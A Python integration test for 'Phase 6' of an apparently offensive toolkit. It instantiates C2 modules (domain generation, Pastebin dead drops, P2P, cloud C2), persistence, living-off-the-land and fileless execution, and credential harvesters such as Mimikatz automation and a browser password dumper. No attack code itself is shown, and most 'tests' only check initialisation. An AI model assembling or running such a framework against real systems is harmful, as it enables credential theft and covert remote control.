"""
Phase 6 Integration Test
Tests all Phase 6 components
"""

import asyncio
import logging
from pathlib import Path

# Configure logging
logging.basicConfig(
    level=logging.INFO,
    format='%(asctime)s - %(name)s - %(levelname)s - %(message)s'
)

logger = logging.getLogger(__name__)


async def test_c2_infrastructure():
    """Test C2 infrastructure components"""
    logger.info("\n" + "=" * 60)
    logger.info("Testing C2 Infrastructure")
    logger.info("=" * 60)
    
    # Test DGA
    from c2_infrastructure.domain_generation import HybridDGA
    dga = HybridDGA(seed="test")
    domains = dga.generate_domains(count=5)
    logger.info(f"✓ DGA generated {len(domains)} domains: {domains[:3]}")
    
    # Test Dead Drop Resolver
    from c2_infrastructure.dead_drop_resolver import DeadDropResolver, PastebinDeadDrop
    resolver = DeadDropResolver()
    resolver.register_dead_drop(PastebinDeadDrop())
    logger.info(f"✓ Dead drop resolver with {len(resolver.dead_drops)} dead drop(s)")
    
    # Test P2P Network
    from c2_infrastructure.p2p_network import P2PNetwork
    p2p = P2PNetwork(node_id="test_node")
    # Note: Not starting server in test to avoid blocking
    logger.info(f"✓ P2P network initialized (node: {p2p.node_id})")
    
    # Test Cloud C2
    from c2_infrastructure.cloud_c2 import CloudC2Infrastructure
    cloud = CloudC2Infrastructure()
    logger.info(f"✓ Cloud C2 initialized with {len(cloud.providers)} providers")
    
    logger.info("✓ C2 Infrastructure tests passed\n")


async def test_persistence():
    """Test persistence mechanisms"""
    logger.info("\n" + "=" * 60)
    logger.info("Testing Persistence Mechanisms")
    logger.info("=" * 60)
    
    from persistence.persistence_manager import PersistenceManager
    
    manager = PersistenceManager()
    logger.info(f"✓ Persistence manager with {len(manager.mechanisms)} mechanisms")
    
    # Note: Not actually installing for safety
    logger.info("✓ Persistence mechanisms available:")
    for mech in manager.mechanisms:
        logger.info(f"  - {mech.name}: {mech.description}")
    
    logger.info("✓ Persistence tests passed\n")


async def test_lolbas():
    """Test Living Off The Land techniques"""
    logger.info("\n" + "=" * 60)
    logger.info("Testing Living Off The Land")
    logger.info("=" * 60)
    
    from living_off_land.lolbas_manager import LOLBASManager
    from living_off_land.windows_lol import WindowsLOL
    from living_off_land.linux_lol import LinuxLOL
    
    manager = LOLBASManager()
    logger.info("✓ LOLBAS manager initialized")
    
    windows = WindowsLOL()
    logger.info(f"✓ Windows LOLBAS initialized")
    
    linux = LinuxLOL()
    logger.info(f"✓ Linux LOLBAS initialized")
    
    # Test fileless executor
    from living_off_land.fileless_executor import FilelessExecutor
    executor = FilelessExecutor()
    logger.info("✓ Fileless executor initialized")
    
    logger.info("✓ LOLBAS tests passed\n")


async def test_credential_harvesting():
    """Test credential harvesting"""
    logger.info("\n" + "=" * 60)
    logger.info("Testing Credential Harvesting")
    logger.info("=" * 60)
    
    from credential_harvesting.credential_manager import CredentialManager, Credential
    
    manager = CredentialManager()
    
    # Add test credentials
    cred1 = Credential(
        username="testuser",
        password="testpass",
        credential_type="plaintext",
        source="test"
    )
    manager.credentials.append(cred1)
    
    # Test harvesters
    from credential_harvesting.mimikatz_automation import MimikatzAutomation
    from credential_harvesting.browser_dumper import BrowserPasswordDumper
    from credential_harvesting.kerberos_harvester import KerberosHarvester
    from credential_harvesting.memory_scraper import MemoryScraper
    
    mimikatz = MimikatzAutomation()
    browser = BrowserPasswordDumper()
    kerberos = KerberosHarvester()
    memory = MemoryScraper()
    
    manager.register_harvester(mimikatz.name, mimikatz)
    manager.register_harvester(browser.name, browser)
    manager.register_harvester(kerberos.name, kerberos)
    manager.register_harvester(memory.name, memory)
    
    logger.info(f"✓ Credential manager with {len(manager.harvesters)} harvesters")
    
    # Test export
    export_path = Path("test_creds.json")
    await manager.export_credentials(export_path, "json")
    if export_path.exists():
        logger.info(f"✓ Credentials exported to {export_path}")
        export_path.unlink()  # Clean up
    
    # Test statistics
    stats = manager.get_statistics()
    logger.info(f"✓ Statistics: {stats}")
    
    logger.info("✓ Credential harvesting tests passed\n")


async def test_phase6_engine():
    """Test Phase 6 engine orchestrator"""
    logger.info("\n" + "=" * 60)
    logger.info("Testing Phase 6 Engine")
    logger.info("=" * 60)
    
    from core.phase6_engine import Phase6Engine
    
    engine = Phase6Engine()
    logger.info("✓ Phase 6 engine initialized")
    
    logger.info(f"✓ C2 Manager: {type(engine.c2_manager).__name__}")
    logger.info(f"✓ Persistence Manager: {type(engine.persistence_manager).__name__}")
    logger.info(f"✓ LOLBAS Manager: {type(engine.lolbas_manager).__name__}")
    logger.info(f"✓ Credential Manager: {type(engine.credential_manager).__name__}")
    
    # Test operation logging
    engine.log_operation("Test Operation", "success", "Test details")
    log = engine.get_operation_log()
    logger.info(f"✓ Operation log: {len(log)} entries")
    
    logger.info("✓ Phase 6 engine tests passed\n")


async def main():
    """Run all tests"""
    logger.info("\n" + "=" * 70)
    logger.info(" " * 20 + "PHASE 6 INTEGRATION TEST")
    logger.info("=" * 70)
    
    try:
        # Run all tests
        await test_c2_infrastructure()
        await test_persistence()
        await test_lolbas()
        await test_credential_harvesting()
        await test_phase6_engine()
        
        logger.info("\n" + "=" * 70)
        logger.info(" " * 25 + "ALL TESTS PASSED ✓")
        logger.info("=" * 70)
        logger.info("\nPhase 6 modules:")
        logger.info("  - C2 Infrastructure: 7 modules")
        logger.info("  - Persistence: 5 modules")
        logger.info("  - Living Off The Land: 4 modules")
        logger.info("  - Credential Harvesting: 6 modules")
        logger.info("  - Orchestrator: 1 module")
        logger.info("  Total: 23 modules\n")
        
        return True
        
    except Exception as e:
        logger.error(f"\n✗ Test failed: {e}")
        import traceback
        traceback.print_exc()
        return False


if __name__ == "__main__":
    success = asyncio.run(main())
    exit(0 if success else 1)
